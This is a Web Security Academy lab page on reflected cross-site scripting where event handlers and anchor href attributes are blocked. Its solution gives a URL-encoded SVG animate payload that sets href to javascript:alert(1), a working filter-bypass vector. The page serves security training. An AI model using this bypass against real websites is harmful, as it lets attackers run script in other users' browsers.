# Lab: Reflected XSS with event handlers and href attributes blocked

Source: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
Fetched: 2026-06-28T09:17:44.236729+00:00

Web Security Academy

Cross-site scripting

Contexts

Lab

Lab: Reflected XSS with event handlers and href attributes blocked

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

<a href="">Click me</a>

Solution

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:

https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

Community solutions

z3nsh3ll

Michael Sommer

Find XSS vulnerabilities using Burp Suite

Try for free
